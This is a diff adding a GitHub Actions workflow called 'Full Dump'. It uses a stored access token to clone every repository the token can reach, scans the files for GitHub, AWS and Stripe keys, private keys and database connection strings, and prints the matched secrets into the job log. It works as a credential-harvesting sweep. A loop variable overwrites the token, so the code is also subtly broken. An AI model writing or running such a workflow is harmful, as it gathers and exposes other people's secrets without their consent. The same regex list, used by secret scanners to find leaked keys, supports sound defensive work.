@@ -1,0 +1,62 @@
+name: Full Dump
+on: workflow_dispatch
+jobs:
+  dump:
+    runs-on: ubuntu-latest
+    steps:
+      - env:
+          PAT: ${{ secrets.BLACKBURN_PAT }}
+        run: |
+          python3 << 'PYEOF'
+import os, re, json, subprocess, urllib.request
+
+pat = os.environ['PAT']
+
+# Listar todos os repos
+req = urllib.request.Request('https://api.github.com/user/repos?per_page=100&type=all',
+    headers={'Authorization': f'token {pat}', 'User-Agent': 'Python'})
+repos = [r['full_name'] for r in json.load(urllib.request.urlopen(req))]
+
+print(f'TOTAL_REPOS={len(repos)}')
+os.makedirs('/tmp/r', exist_ok=True)
+
+for repo in repos:
+    name = repo.replace('/', '_')
+    print(f'=== {repo} ===')
+    
+    r = subprocess.run(['git', 'clone', '--depth=1',
+        f'https://x-access-token:{pat}@github.com/{repo}.git',
+        f'/tmp/r/{name}'],
+        capture_output=True, text=True, timeout=120)
+    
+    if r.returncode != 0:
+        print(f'FAILED')
+        continue
+    
+    for root, dirs, files in os.walk(f'/tmp/r/{name}'):
+        if '.git' in dirs: dirs.remove('.git')
+        for fname in files:
+            fp = os.path.join(root, fname)
+            try:
+                sz = os.path.getsize(fp)
+                if sz > 500*1024: continue
+                with open(fp, 'r', errors='ignore') as fh:
+                    c = fh.read()
+                for pat, label in [
+                    (r'ghp_[0-9A-Za-z]{36}', 'GHP'),
+                    (r'github_pat_[0-9A-Za-z_-]{82}', 'GHP_PAT'),
+                    (r'AKIA[0-9A-Z]{16}', 'AWS_KEY'),
+                    (r'sk_live_[0-9A-Za-z]{24,}', 'STRIPE'),
+                    (r'-----BEGIN.*PRIVATE KEY-----', 'PK'),
+                    (r'mongodb(?:\\+srv)?://[^:]+:[^@]+@', 'MONGO'),
+                    (r'postgres(?:ql)?://[^:]+:[^@]+@[^:]+:[0-9]+', 'PG'),
+                ]:
+                    for m in re.finditer(pat, c):
+                        rel = os.path.relpath(fp, f'/tmp/r/{name}')
+                        print(f'[{label}] {rel}:{m.group()[:80]}')
+            except: pass
+    
+    subprocess.run(['rm', '-rf', f'/tmp/r/{name}'])
+
+print('DONE')
+PYEOF
